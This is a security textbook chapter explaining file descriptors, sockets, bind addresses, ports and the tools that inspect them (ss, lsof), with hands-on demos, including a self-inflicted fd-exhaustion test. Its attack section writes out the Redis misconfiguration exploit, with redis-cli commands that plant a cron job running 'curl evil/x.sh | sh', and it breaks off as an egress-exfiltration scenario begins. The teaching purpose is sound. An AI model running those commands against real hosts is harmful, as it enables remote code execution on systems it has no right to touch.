# Chapter 3 — Files, Descriptors, Sockets, and Ports: How a Program Reaches the World

---

## 1. Why This Matters

In Chapter 2 you learned that a file descriptor is a capability and that a socket is a file
descriptor. This chapter follows that thread all the way out to the network, because the
single most common phrase in cloud security — "expose the service on port 443" — hides an
enormous amount of machinery, and every firewall, security group, NACL, and NetworkPolicy
in this book is ultimately a filter on the objects this chapter describes.

Consider the questions a cloud security engineer answers weekly:

- "Is this port open?" — Open where? Bound to what address? By which process, running as
  which user? Reachable from where? Four different questions hide inside that one.
- "The security group allows 0.0.0.0/0 on 22 but the service isn't reachable." — Because
  `sshd` is bound to `127.0.0.1`, not `0.0.0.0`. The cloud control plane and the kernel
  disagree, and you need to know both layers to resolve it.
- "How did the attacker exfiltrate data if egress is blocked?" — Because "blocked" was a
  security-group rule, and the process opened a socket to a permitted destination (a DNS
  resolver, an S3 endpoint, the metadata service) that the rule allowed.
- "What is this box actually listening on?" — a question you answer with `ss`, and whose
  answer *is* the host's network attack surface.

There is also a conceptual payoff. Unix's defining idea is that **everything is a file** —
regular files, directories, devices, pipes, and network sockets all present the same
`read`/`write`/`close` interface. Understanding that unification is what lets you reason
about a TLS connection, a log file, and `/dev/urandom` with the same mental tools, and it
is why SSRF (Chapter 50), log injection (Chapter 36), and path traversal (Chapter 53) are
recognizably the same *shape* of bug appearing on different file-like objects.

By the end of this chapter, "a process is listening on a port" will decompose in your head
into a specific set of kernel objects and a specific set of syscalls, and you will be able
to say precisely what a firewall can and cannot do about it.

---

## 2. Prerequisites

- Chapter 2, especially §4.5 (file descriptors) and §4.3 (the syscall mechanism).
- Chapter 1 §4.4 (address space) — sockets have buffers, and buffers live in memory.
- You have used `curl`, `ss`/`netstat`, and edited an Nginx or firewall config.
- Deep networking (TCP, IP) is Part 1. This chapter treats the socket as the *interface* to
  the network; the protocols inside are Chapters 18–20.

---

## 3. Mental Model

**A file descriptor is a handle to a stream of bytes. What is on the other end of the stream
is the kernel's business, not the program's.**

```
   Your process
   +-------------------------------------------+
   |  fd 3  -> /app/config.json   (regular file)|
   |  fd 4  -> /dev/urandom       (device)      |
   |  fd 5  -> pipe to child      (pipe)        |
   |  fd 6  -> listening socket   :443          |
   |  fd 19 -> connected socket   -> PostgreSQL |
   |  fd 24 -> connected socket   -> a browser  |
   +-------------------------------------------+
              |  every one of these speaks:
              |     read(fd, buf, n)   write(fd, buf, n)   close(fd)
              v
   +===========================================+
   |  KERNEL: the Virtual File System (VFS)     |
   |  dispatches read/write to the right driver |
   |    file  -> ext4/xfs -> page cache -> disk  |
   |    socket-> TCP/IP stack -> NIC             |
   |    pipe  -> in-memory ring buffer           |
   |    device-> device driver                   |
   +===========================================+
```

The program calls `write(fd, buf, n)` and does not know or care whether the bytes land on an
SSD, in another process, or on a fiber crossing an ocean. The VFS layer decides. That is the
abstraction, and it is beautiful — and, like every abstraction in this book, its leaks are
where security lives:

- If a program that means to write to a *file* can be tricked into writing to a *socket*, or
  reading a *device* it should not, the uniform interface becomes a vulnerability. That is
  the essence of SSRF and several file-handling bugs.
- A socket is identified on the network by a **4-tuple**: `(source IP, source port,
  destination IP, destination port)`. That tuple is the atomic unit that every network
  security control operates on. Firewalls match it. Connection tracking (Chapter 37) keys on
  it. NAT (Chapter 14) rewrites it. Flow logs (Chapter 82) record it. Learn it as a unit.

**Second model — the two questions about any port:**

```
   "Is port 443 open?"  splits into TWO independent questions:

   (1) BIND:  is a process listening, and on WHICH address?
              127.0.0.1:443  -> reachable only from localhost
              10.0.1.5:443   -> reachable only via that interface
              0.0.0.0:443    -> reachable via every interface
              [::]:443       -> every IPv6 interface (and often IPv4 too)

   (2) REACHABILITY: can packets from the client actually arrive?
              host firewall (iptables/nftables)
              cloud security group / NACL
              routing (is there a path at all?)
```

An enormous fraction of real-world "why can't I connect / why is this exposed" confusion is
a failure to separate these two questions. A service bound to `0.0.0.0` with a closed
security group is *not* exposed. A service bound to `127.0.0.1` with an open security group
is *not* exposed. Exposure requires *both*. Keep them separate and you will debug network
reachability faster than most of your team.

---

## 4. Fundamentals

### 4.1 The Virtual File System and the "everything is a file" abstraction

When your process calls `open("/app/config.json", O_RDONLY)`, the kernel's **VFS (Virtual
File System)** layer does the work:

```
open("/app/config.json", O_RDONLY)
   1. Path resolution: walk the path components, following each directory's
      entries, checking EXECUTE permission on each directory and resolving
      symlinks, until reaching the target inode.
   2. Permission check on the inode: is O_RDONLY allowed for this euid/egid?
   3. Allocate a `struct file` (offset=0, mode=read, f_op=ext4 operations).
   4. Install it in the process's fd table at the lowest free index; return that index.
```

An **inode** is the on-disk (and cached-in-memory) structure describing a file: its owner,
permissions, timestamps, size, and the block pointers to its data. Note what an inode does
*not* contain: the filename. Names live in *directories*, which map names to inode numbers.
This indirection has direct security consequences:

- **Hard links**: two names, one inode. Deleting one name does not delete the data; the
  inode persists until its link count hits zero. An attacker who can create a hard link to a
  file they will later lose read access to keeps their link — a classic setuid-era trick.
- **Symlinks**: a file whose contents are a path. Following them is where **path traversal**
  and **TOCTOU** bugs live (Chapters 53 and 55): the path you checked and the path you opened
  can differ if a symlink changed in between.
- **`/proc/PID/root` and bind mounts** rely on this name/inode split, which is why container
  filesystem isolation (Chapter 93) is really about which *mount namespace* and which *root*
  a process resolves paths against.

The unifying `f_op` (file operations) table is the key: each kind of object provides its own
`read`, `write`, `poll`, etc. The VFS calls through the table. A regular file's `read` pulls
from the page cache; a socket's `read` pulls from the TCP receive buffer; a pipe's `read`
pulls from a ring buffer. **Same syscall, different `f_op`.** This is the mechanism behind
the abstraction, and it is worth seeing concretely (§6).

### 4.2 Special files that matter to security

Several file-like objects are security-relevant in their own right:

| Path | What it is | Security relevance |
|---|---|---|
| `/dev/urandom`, `/dev/random` | kernel CSPRNG | the source of all cryptographic randomness; Chapter 25. Use `getrandom()`; never roll your own RNG |
| `/dev/null`, `/dev/zero` | bit bucket / zero source | benign, but redirecting logs to `/dev/null` destroys audit trails |
| `/dev/mem`, `/dev/kmem` | physical / kernel memory | direct memory access; blocked in containers and hardened kernels |
| `/proc/PID/mem` | a process's memory as a file | read secrets from a live process (Chapter 1 §8.5) |
| `/proc/PID/environ` | a process's environment | leaks env-var secrets; world-readable to same UID |
| `/proc/net/tcp` | kernel socket table | where `ss` gets its data; readable enumeration of connections |
| `/sys/...` | kernel/device parameters | partially namespaced; an escape surface in containers |
| Unix domain sockets | local IPC as a filesystem path | `/var/run/docker.sock` — mounting it into a container is instant host takeover (Chapter 96) |

That last row is one of the most important single facts in container security, and it is a
direct consequence of "a socket is a file": the Docker daemon's control socket is a
file-like object at a filesystem path, so mounting that path into a container hands the
container full control of the daemon, which runs as root on the host. We will exploit and
then prevent this in Chapter 96; the point here is that it is *not* a special case — it is
the everything-is-a-file abstraction working exactly as designed, applied to a very
powerful endpoint.

### 4.3 What a socket actually is

A **socket** is an endpoint for communication, created by the `socket()` syscall, which
returns a file descriptor:

```c
int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
//               |        |            |
//               |        |            +-- protocol: TCP
//               |        +--------------- type: stream (reliable, ordered) = TCP
//               |                              SOCK_DGRAM = UDP, SOCK_RAW = raw packets
//               +------------------------ address family: AF_INET = IPv4
//                                              AF_INET6 = IPv6, AF_UNIX = local IPC
```

At this point the socket is a file descriptor with no address — an unconnected endpoint. What
happens next depends on whether the program is a **server** or a **client**.

The socket family (`AF_*`) already carries security meaning:

- **`AF_INET`/`AF_INET6`** — network sockets. The whole of Part 1 is about what happens
  inside these.
- **`AF_UNIX`** — local IPC over a filesystem path or an abstract name. No network stack, no
  ports; access is controlled by filesystem permissions on the socket path (or, for abstract
  sockets, by network namespace). Used by Docker, systemd, PostgreSQL's local connections,
  and X11. Faster and — when bound to a file with correct permissions — more securable than a
  loopback TCP socket, because you get filesystem ACLs instead of "anything on localhost can
  connect."
- **`SOCK_RAW`** — build packets by hand, below TCP/UDP. Requires `CAP_NET_RAW` (Chapter 2
  §8.3). This is how `ping`, `nmap`'s SYN scans, and packet crafting tools work, and why
  that capability is security-sensitive.

### 4.4 The server path: bind, listen, accept

```c
int lfd = socket(AF_INET, SOCK_STREAM, 0);

int opt = 1;
setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));  // reuse TIME_WAIT addrs

struct sockaddr_in addr = {
    .sin_family = AF_INET,
    .sin_port   = htons(443),           // network byte order! (Chapter 7)
    .sin_addr   = { .s_addr = INADDR_ANY }  // 0.0.0.0 — THE security decision
};
bind(lfd, (struct sockaddr*)&addr, sizeof(addr));   // claim the address:port
listen(lfd, 511);                                    // become a passive/listening socket
                                                     // 511 = backlog (pending-connection queue)

for (;;) {
    int cfd = accept(lfd, ...);   // returns a NEW fd for one client connection
    handle(cfd);                  // lfd keeps listening; cfd is this conversation
}
```

Four security-critical details in that sequence:

**1. The bind address is the exposure decision, and it happens in the process, not the
firewall.** `INADDR_ANY` (`0.0.0.0`) binds every interface. `127.0.0.1` binds only loopback.
`10.0.1.5` binds one specific interface. This choice is made *in application code or config*,
below any cloud control. When a database "should only be reachable internally," binding it to
a private interface (or a Unix socket) is defense in depth that survives a security-group
misconfiguration. Countless breaches trace to a database bound to `0.0.0.0` combined with a
too-open security group — two independent mistakes that had to coincide, which is exactly why
having both layers is protective.

**2. Binding a port below 1024 requires privilege** (`CAP_NET_BIND_SERVICE` or root),
because these are the "well-known" ports and historically only the administrator should run
services claiming them. This is why the Nginx pattern from Chapter 2 §7 binds 80/443 while
root, then drops. In containers and modern designs, the better answer is usually to bind an
unprivileged port (8080) and let the load balancer own 443.

**3. `accept()` returns a new fd per connection.** The listening socket (`lfd`) and each
connected socket (`cfd`) are distinct kernel objects. This is why `ss` distinguishes `LISTEN`
sockets from `ESTAB` sockets, and why one listening port can carry tens of thousands of
simultaneous connections — each is its own 4-tuple, its own buffers, its own fd.

**4. The backlog is a resource, and therefore a DoS target.** Pending connections queue
until `accept()`ed. The SYN backlog and the accept backlog are finite; flooding them is the
basis of the SYN flood attack (Chapter 19), which SYN cookies mitigate.

### 4.5 The client path: connect

```c
int fd = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in dst = {
    .sin_family = AF_INET,
    .sin_port   = htons(5432),                  // PostgreSQL
    .sin_addr   = { .s_addr = inet_addr("10.0.2.10") }
};
connect(fd, (struct sockaddr*)&dst, sizeof(dst));   // kernel picks a source port,
                                                    // performs the TCP handshake (Ch.19)
write(fd, query, len);
read(fd, response, cap);
```

The kernel automatically assigns a **source port** from the ephemeral range (typically
32768–60999 on Linux; Chapter 21). So the full 4-tuple for this connection becomes something
like `(10.0.1.5:41284, 10.0.2.10:5432)`. That source port matters more than it seems:

- **Connection tracking** (Chapter 37) and **NAT** (Chapter 14) key on the full tuple, so the
  ephemeral source port is what lets many outbound connections share one public IP.
- **Egress firewall rules** that only match destination let all of this through — which is
  why "we block egress" usually means "we block egress *to unapproved destinations*", and an
  attacker who can reach an *approved* destination (a package registry, a monitoring
  endpoint, the metadata IP) has an exfiltration channel. This is the mechanism behind the
  exfiltration question in §1.

### 4.6 Ports as a namespace

A **port** is a 16-bit number (0–65535) that, together with an IP address and protocol,
identifies one endpoint. It is a multiplexing key: one host, one IP, but many services,
distinguished by port. Categories:

| Range | Name | Notes |
|---|---|---|
| 0–1023 | Well-known / system | privileged to bind; HTTP 80, HTTPS 443, SSH 22, DNS 53 |
| 1024–49151 | Registered | assigned to applications; PostgreSQL 5432, Redis 6379, RabbitMQ 5672 |
| 49152–65535 | Dynamic / ephemeral | source ports for outbound connections (Linux default range differs — §4.5) |

Two things engineers routinely get wrong:

- **A port number is a convention, not a contract.** Nothing forces HTTPS onto 443. Malware
  runs C2 on 443 precisely because 443 egress is almost always allowed. Detection cannot
  rely on "port 443 = HTTPS"; it must inspect the traffic (Chapter 24) or rely on TLS
  fingerprinting (JA3/JA4).
- **"The port is closed" is ambiguous.** A closed port may mean nothing is listening (the
  kernel replies with a TCP RST or ICMP port-unreachable), or a firewall silently dropped
  the packet (no reply at all). The difference — RST vs. drop — is exactly what `nmap`
  measures to distinguish `closed` from `filtered` (Chapter 123).

---

## 5. Deep Technical Explanation

### 5.1 The kernel's socket data structures

When you create and connect a socket, the kernel builds a small tower of structures:

```
   fd (integer in your fd table)
      |
      v
   struct file  (f_op = socket_file_ops; so read/write dispatch to the socket layer)
      |
      v
   struct socket  (the BSD-layer socket: state, type, protocol ops)
      |
      v
   struct sock    (the network-layer socket: THE important one)
        - receive buffer (sk_rmem)   <- bytes arrived, not yet read()
        - send buffer    (sk_wmem)   <- bytes write()n, not yet ACKed
        - the 4-tuple    (saddr, sport, daddr, dport)
        - protocol state (TCP: ESTABLISHED, etc. — the state machine of Chapter 19)
        - connection tracking, congestion state, timers
```

The two buffers are where a lot of behavior and several attacks live:

- **The receive buffer holds data the application has not yet `read()`.** If the application
  is slow (or deliberately made slow), this buffer fills, TCP advertises a smaller window,
  and the sender backs off (flow control, Chapter 20). An attacker exploits the reverse — a
  client that reads slowly forces the *server's* send buffer to fill, tying up server memory
  per connection: the "slow read" DoS.
- **The send buffer holds data written but not yet acknowledged.** This is why `write()`
  returning does not mean the peer received the data — it means the kernel accepted it into
  the send buffer. Chapter 19's reliability guarantees live here.
- **Buffer memory is charged per socket and, in aggregate, is finite kernel memory.** Many
  slow connections × per-connection buffers = memory exhaustion. This is why connection
  limits, timeouts, and reverse proxies that absorb slow clients (Chapter 5) are security
  controls, not just performance tuning.

### 5.2 From `write()` to the wire, end to end

Trace a single `write(fd, "GET / HTTP/1.1...", 200)` on a connected TCP socket:

```
1. write(fd, buf, 200)                    [ring 3 -> ring 0]
2. VFS: f_op->write_iter -> socket layer -> tcp_sendmsg
3. copy_from_user: 200 bytes copied into the socket SEND BUFFER (sk_wmem)
   - if the buffer is full and the socket is blocking, write() BLOCKS here
   - if non-blocking, returns EAGAIN (this is what epoll-based servers handle)
4. TCP decides how much to send now (congestion window, receiver window — Ch.20)
5. Build a TCP segment: prepend the TCP header (ports, seq/ack, flags) — Ch.19
6. Hand to IP: prepend the IP header (src/dst IP, TTL, protocol) — Ch.10, Ch.12
7. Routing: which interface? consult the routing table -> egress NIC (Ch.12)
8. Neighbor: what MAC address for the next hop? ARP (Ch.9) -> prepend Ethernet header
9. Hand to the NIC driver -> DMA the frame to the NIC -> onto the wire (Ch.8)
10. write() has long since returned; ACKs arrive later and free send-buffer space
```

You do not need to hold all of that yet — Part 1 builds each layer. But notice the shape:
**every layer prepends its own header and hands down**, and every security control in this
book operates at one of these layers. A security group filters at layers 3–4 (IP and port).
A WAF filters at layer 7 (the HTTP text in step 1). TLS encrypts the payload between steps 3
and 5's logical positions. Knowing which layer a control sees is knowing what it can and
cannot enforce — a WAF cannot block by MAC address; a security group cannot block a specific
URL path. This "which layer sees what" reasoning is the spine of Chapter 4 and of Part 1.

### 5.3 Blocking, non-blocking, and the C10k problem

A naive server does `accept()`, then handles the client fully, then `accept()`s the next —
one connection at a time. To handle many clients, early servers forked a process per
connection, then spawned a thread per connection. Both consume a lot of memory and scheduler
time; neither scales to tens of thousands of connections (the "C10k problem").

The modern answer, used by Nginx, Kestrel, Node.js, and Redis, is **event-driven I/O with
`epoll`**:

```c
int epfd = epoll_create1(0);
struct epoll_event ev = { .events = EPOLLIN, .data.fd = lfd };
epoll_ctl(epfd, EPOLL_CTL_ADD, lfd, &ev);   // watch the listening socket

for (;;) {
    struct epoll_event events[1024];
    int n = epoll_wait(epfd, events, 1024, -1);   // ONE syscall waits on ALL fds
    for (int i = 0; i < n; i++) {
        if (events[i].data.fd == lfd) {
            int cfd = accept4(lfd, ..., SOCK_NONBLOCK);
            epoll_ctl(epfd, EPOLL_CTL_ADD, cfd, ...);   // watch the new client too
        } else {
            handle_ready_socket(events[i].data.fd);      // read/write without blocking
        }
    }
}
```

One (or a few) threads multiplex thousands of connections. Sockets are non-blocking, so
`read`/`write` return `EAGAIN` rather than blocking, and the thread moves on. This is the
kernel-level reality behind every `async`/`await` in your ASP.NET Core code (Chapter 2 §5.2).

The security consequences are worth stating explicitly, because they are counterintuitive:

- **A handful of threads serve everyone.** Per-connection state that leaks across the pool is
  a cross-tenant leak (Chapter 51). There is no thread-per-user isolation to save you.
- **Anything that blocks the event loop stalls every connection it serves.** A synchronous
  DB call, a slow regex on attacker input (ReDoS, Chapter 55), or a blocking file read is an
  availability attack amplifier — one slow request degrades thousands.
- **`epoll` scalability cuts both ways.** The same efficiency that lets one server hold
  100,000 legitimate connections lets it hold 100,000 malicious idle connections until
  memory or fd limits are hit. `ulimit -n` (the per-process fd limit) and connection
  timeouts are the controls.

### 5.4 File descriptor limits as a security boundary

Every fd consumes kernel memory and counts against limits:

```bash
$ ulimit -n                    # soft limit for this shell
1024
$ cat /proc/sys/fs/file-max    # system-wide maximum
9223372036854775807
$ cat /proc/1842/limits | grep 'open files'
Max open files            1024                 524288               files
```

fd exhaustion is a real and often-overlooked availability failure:

- A connection leak (sockets not `close()`d) climbs toward the limit; new `accept()`/`open()`
  calls fail with `EMFILE`, and the service stops accepting connections while appearing
  "up." This is indistinguishable from a slow-loris DoS from the outside.
- Attackers deliberately open and hold many connections to exhaust fds.
- The mitigation is bounded: raise limits appropriately (`LimitNOFILE` in systemd), set
  connection timeouts, cap concurrent connections at the reverse proxy, and *monitor* fd
  usage (`ls /proc/PID/fd | wc -l` over time) as a leading indicator.

This is a recurring theme: **finite kernel resources — fds, buffers, conntrack entries,
ephemeral ports, PIDs — are all DoS targets, and defending them is part of security, not
just operations.**

---

## 6. Internals: Observing Sockets and Files

### 6.1 `ss` — the single most important host-networking command

`ss` reads the kernel's socket tables (`/proc/net/tcp`, `/proc/net/tcp6`, and the newer
netlink `sock_diag` interface). Learn this command cold; you will use it in every incident.

```bash
$ ss -tulpn
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process
tcp   LISTEN 0      511    127.0.0.1:5432       0.0.0.0:*          users:(("postgres",pid=1990,fd=6))
tcp   LISTEN 0      511    0.0.0.0:80           0.0.0.0:*          users:(("nginx",pid=640,fd=6))
tcp   LISTEN 0      4096   0.0.0.0:5000         0.0.0.0:*          users:(("dotnet",pid=1842,fd=200))
tcp   LISTEN 0      511    127.0.0.1:6379       0.0.0.0:*          users:(("redis-server",pid=2101,fd=7))
udp   UNCONN 0      0      127.0.0.53%lo:53     0.0.0.0:*          users:(("systemd-resolve",pid=610,fd=13))
```

Decode the flags and then read the output as a security engineer:

- `-t` TCP, `-u` UDP, `-l` listening only, `-p` show process, `-n` numeric (no DNS/port-name
  resolution — always use `-n` in security work so you see `443` not `https` and `10.0.2.10`
  not a reverse-DNS name an attacker could control).

Now the analysis, which is the actual skill:

- **PostgreSQL and Redis are bound to `127.0.0.1`.** Good — unreachable from the network
  regardless of the security group. This is the defense-in-depth bind decision from §4.4.
- **Nginx is on `0.0.0.0:80`** — intentionally public.
- **`dotnet` (Kestrel) is on `0.0.0.0:5000`.** This is a finding. Kestrel should be bound to
  `127.0.0.1` and fronted by Nginx; exposing it directly bypasses the reverse proxy's TLS,
  rate limiting, and header sanitization. `Recv-Q`/`Send-Q` on a LISTEN socket show the
  current and maximum backlog — a persistently non-zero `Recv-Q` here means connections are
  arriving faster than they are `accept()`ed (overload or a SYN flood).

Compare established connections:

```bash
$ ss -tnp state established
Recv-Q Send-Q Local Address:Port   Peer Address:Port   Process
0      0      10.0.1.5:5000        10.0.1.9:52344      users:(("dotnet",pid=1842,fd=24))
0      0      10.0.1.5:41284       10.0.2.10:5432      users:(("dotnet",pid=1842,fd=19))
```

There is your API's inbound connection from a client (fd 24) and its outbound connection to
PostgreSQL (fd 19) — the exact fds from Chapter 2 §4.5, now with their 4-tuples. During an
incident, `ss -tnp` showing an unexpected outbound connection from your API process (to an
IP that is not your database, cache, or queue) is often the first hard evidence of
compromise.

### 6.2 Seeing that a socket really is a file

```bash
$ ls -l /proc/1842/fd/19
lrwx------ 1 ledger ledger 64 Sep 15 10:22 /proc/1842/fd/19 -> 'socket:[483001]'

$ ss -tnp | grep 483001          # the inode number links the fd to the connection
0  0  10.0.1.5:41284  10.0.2.10:5432  users:(("dotnet",pid=1842,fd=19))
```

The fd points to `socket:[inode]`; the inode is the join key between the process view
(`/proc/PID/fd`) and the network view (`ss`). This is exactly how tooling correlates "which
process owns this connection" — and how you do it by hand at 3 a.m.

### 6.3 Unix domain sockets and the Docker socket

```bash
$ ss -xlp | grep -E 'docker|postgres'
u_str LISTEN 0 4096 /var/run/docker.sock 24680 * 0 users:(("dockerd",pid=900,fd=8))
u_str LISTEN 0 4096 /var/run/postgresql/.s.PGSQL.5432 25001 * 0 users:(("postgres",pid=1990,fd=5))

$ ls -l /var/run/docker.sock
srw-rw---- 1 root docker 0 Sep 15 08:00 /var/run/docker.sock
```

Read the permissions on `docker.sock`: `srw-rw----`, owner root, group docker. **Membership
in the `docker` group is equivalent to root**, because anyone who can write to this socket
can ask the daemon to run a container that mounts the host filesystem. This is one of the
most consequential "quiet" privilege grants on a Linux host, and it is invisible unless you
know to look at it. Chapter 96 turns this into a full escape; Chapter 33 covers the group
membership question generally.

### 6.4 lsof — the same data, file-centric

```bash
$ sudo lsof -i :5432            # who is using port 5432?
COMMAND  PID     USER  FD  TYPE  DEVICE  NODE NAME
postgres 1990 postgres  6u IPv4  483001   TCP localhost:5432 (LISTEN)
dotnet   1842   ledger 19u IPv4  483002   TCP localhost:41284->localhost:5432 (ESTABLISHED)

$ sudo lsof -p 1842 | grep -E 'REG|sock'   # everything process 1842 has open
```

`ss` for sockets, `lsof` when you want files and sockets together. Both answer the incident
question "what does this process have open right now," which is often the fastest route from
"something is wrong" to "here is what it is talking to."

---

## 7. Real-World Example: The Ledger Stack's Sockets

System A, mapped to its actual sockets, is the clearest possible illustration of bind-address
as a security control:

```
+----------------------------------------------------------------------+
|  VPS                                                                   |
|                                                                       |
|   Internet ---> 0.0.0.0:443  [nginx, root->www-data]                  |
|                     |  (TLS terminated here — Chapter 28)             |
|                     |  proxy_pass to 127.0.0.1:5000                    |
|                     v                                                  |
|              127.0.0.1:5000  [dotnet Kestrel, user 'ledger']          |
|                     |                                                  |
|         +-----------+-----------+--------------------+                 |
|         v           v           v                    v                 |
|  127.0.0.1:5432  127.0.0.1:6379  127.0.0.1:5672   (outbound HTTPS)     |
|  [postgres]      [redis]         [rabbitmq]        to AWS S3 API       |
|  user postgres   user redis      user rabbitmq                        |
+----------------------------------------------------------------------+
```

Everything except Nginx is bound to `127.0.0.1`. The security properties that fall out of
this single design choice:

1. **The network attack surface is exactly one port: 443.** PostgreSQL, Redis, RabbitMQ, and
   Kestrel are all unreachable from the network *by the kernel's bind decision*, independent
   of any firewall. Verify with `ss -tlpn` and confirm only `:443` shows `0.0.0.0`.
2. **A firewall misconfiguration cannot expose the database**, because there is no interface
   the database is listening on that faces the network. Two independent controls (bind + SG)
   both have to fail. This is defense in depth stated precisely.
3. **Redis has no password in this setup — and that is survivable only because of the bind.**
   Redis bound to `0.0.0.0` with no auth is one of the most-exploited misconfigurations on
   the internet (attackers write cron jobs via `CONFIG SET dir`). Bound to loopback, the
   blast radius is "any local process as any user that can reach loopback" — still not
   nothing (any compromised local service can hit it), which is why Chapter 5 adds auth
   anyway. The bind reduces the risk; it does not eliminate the need for auth. Defense in
   depth again.
4. **The outbound HTTPS to S3 is the exfiltration channel to reason about.** Egress is not
   loopback-bound; the process can reach the internet. If the API is compromised, this is how
   data leaves. Chapter 8 (cloud network security) constrains egress to VPC endpoints so that
   "reach S3" does not mean "reach the whole internet."

Now the migration to AWS (System B) *changes which layer enforces this*:

- Kestrel in a Fargate task can bind `0.0.0.0` inside its own network namespace safely,
  because the **security group** and the **task's isolated ENI** now provide the boundary the
  loopback bind provided on the VPS.
- PostgreSQL becomes RDS, reachable only from the app's security group — the bind decision
  moves into the security-group rule (Chapter 76).
- The lesson: **the control that provides a security property can move between layers as
  architecture changes, but the property itself — "the database is not reachable from the
  internet" — must always be provided by *something*, and you must be able to name what.**
  In a review, "what makes the database unreachable?" should always have a concrete answer:
  a bind address, a security group, a NetworkPolicy, or a private subnet with no route.

---

## 8. Hands-On Demonstration

### 8.1 Watch a socket's whole lifecycle

Terminal 1 — a minimal server:

```bash
$ ncat -l -k -p 8080 --sh-exec 'echo -e "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nhi"'
# or with Python:
$ python3 -m http.server 8080
```

Terminal 2 — observe:

```bash
$ ss -tlpn | grep 8080
tcp LISTEN 0 5 0.0.0.0:8080 0.0.0.0:* users:(("python3",pid=4102,fd=3))
```

Terminal 3 — connect slowly and watch state:

```bash
$ exec 3<>/dev/tcp/127.0.0.1/8080     # bash opens a TCP socket as fd 3
$ ss -tnp | grep 8080                 # now in ESTABLISHED
$ echo -e "GET / HTTP/1.1\r\nHost: x\r\n\r" >&3
$ cat <&3
$ exec 3>&-                           # close; watch it enter TIME_WAIT
$ ss -tn state time-wait | grep 8080
```

You just drove a TCP connection through `LISTEN` → `ESTABLISHED` → `TIME_WAIT` by hand using
nothing but bash's `/dev/tcp` (itself a lovely demonstration of "everything is a file" — bash
exposes TCP connections as pseudo-files). Chapter 19 explains why `TIME_WAIT` exists; for now
you have seen the states are real kernel state, observable in `ss`.

### 8.2 Prove the bind-address distinction

```bash
# Bind to loopback only:
$ python3 -c "import socket,time; s=socket.socket(); s.bind(('127.0.0.1',9001)); s.listen(); time.sleep(300)" &
# Bind to all interfaces:
$ python3 -c "import socket,time; s=socket.socket(); s.bind(('0.0.0.0',9002)); s.listen(); time.sleep(300)" &

$ ss -tlpn | grep -E '9001|9002'
tcp LISTEN 0 5 127.0.0.1:9001 0.0.0.0:*
tcp LISTEN 0 5 0.0.0.0:9002   0.0.0.0:*

# From another host on the network (or a container), 9001 refuses, 9002 connects.
$ nc -vz <this-host-lan-ip> 9001    # connection refused / no route
$ nc -vz <this-host-lan-ip> 9002    # succeeds
```

The kernel enforces the bind address. No firewall involved. Internalize that 9001 is
*unreachable from the network* purely because of the bind — this is the property System A
relies on for its databases.

### 8.3 Exhaust file descriptors (a controlled DoS)

```bash
$ ulimit -n 64          # lower the limit for this shell only
$ python3 - <<'PY'
import socket
socks = []
try:
    while True:
        s = socket.socket()
        s.connect(('127.0.0.1', 9002))    # against the 8.2 server
        socks.append(s)
except OSError as e:
    print(f"failed after {len(socks)} connections: {e}")
PY
failed after 57 connections: [Errno 24] Too many open files
```

`EMFILE` (errno 24). You just performed the mechanism of an fd-exhaustion DoS against
yourself, and saw the exact error a real service emits when it happens. In production this
manifests as a healthy-looking process that has silently stopped accepting connections —
which is why fd-count monitoring is a leading indicator worth alerting on.

### 8.4 Find every listening port and judge it

```bash
$ sudo ss -tulpn | awk 'NR>1 {print $1, $5, $7}'
# For each line, ask:
#   - is the bind address 0.0.0.0/[::]?  -> network-reachable, justify it
#   - what process/user owns it?
#   - is it supposed to be exposed?
```

This one command, run on any host you are responsible for, produces the host's network attack
surface. Turning that output into "here is what should be exposed, here is what should not,
here is the finding" is a real, billable skill and the core of a host-hardening review
(Chapter 44).

### 8.5 The Unix socket permission demonstration

```bash
$ python3 - <<'PY'
import socket, os
path = "/tmp/demo.sock"
try: os.unlink(path)
except FileNotFoundError: pass
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.bind(path)
os.chmod(path, 0o600)          # only the owner may connect
s.listen()
print("listening on", path, oct(os.stat(path).st_mode & 0o777))
import time; time.sleep(300)
PY
```

```bash
$ ls -l /tmp/demo.sock          # srw------- : filesystem permissions ARE the access control
$ nc -U /tmp/demo.sock          # works as owner; a different user gets EACCES
```

This is the security advantage of `AF_UNIX` over a loopback TCP socket: you get real
filesystem permissions instead of "any local process may connect." When you can, prefer Unix
sockets for local IPC (PostgreSQL, the container runtime, gRPC sidecars) and set their modes
deliberately.

---

## 9. Security Implications

Pulling the threads together:

| Concept | Security consequence |
|---|---|
| Everything is a file | One interface to reason about; but a program tricked into acting on the wrong file-like object (socket vs file) is the shape of SSRF and path-handling bugs |
| Bind address | The exposure decision, made in the process below any firewall; loopback/Unix binds are defense in depth |
| 4-tuple | The atomic unit every network control matches, tracks, rewrites, and logs |
| accept() → new fd | One port, many connections; each connection is its own object with its own buffers (and its own DoS cost) |
| Ports are conventions | Detection cannot trust port = protocol; C2 hides on 443 |
| Socket buffers | Per-connection kernel memory; slow clients weaponize it |
| fd limits | A finite resource; exhaustion is a silent DoS and a leading indicator |
| Unix sockets | Filesystem-permission access control; docker.sock is root |
| Egress reachability | "Blocked egress" usually means "to unapproved destinations"; approved destinations are exfil channels |

The meta-point, consistent with Chapters 1 and 2: **name the layer and name the enforcing
mechanism.** "The database is safe" is not an answer. "The database is bound to loopback
*and* in a private subnet with no route to the internet *and* its security group allows only
the app tier" is an answer, and it tells you exactly what has to fail for it to be wrong.

---

## 10. Attack Scenarios

### 10.1 The exposed internal service

```
Misconfiguration: Redis bound to 0.0.0.0:6379, no auth, security group allows 6379 from a
  wide CIDR (or the instance has a public IP and a permissive SG).
Attack:
  redis-cli -h <victim> config set dir /var/spool/cron/crontabs
  redis-cli -h <victim> config set dbfilename root
  redis-cli -h <victim> set x "\n\n*/1 * * * * curl evil/x.sh | sh\n\n"
  redis-cli -h <victim> save        # writes a cron file -> RCE as the redis user
```

This exact attack has compromised hundreds of thousands of hosts. Two independent
misconfigurations had to coincide: the bind address (`0.0.0.0`) and the reachability (open
SG / public IP). Fix *either* and the attack fails; fix *both* and you have defense in depth.
Add auth and it fails a third way. This is the clearest possible argument for layered
controls, and it is why §7's loopback binds matter.

### 10.2 Egress exfiltration through an "allowed" destination

```
Situation: egress SG blocks all outbound except 443 to anywhere (a common, lax rule).
Attack after RCE:
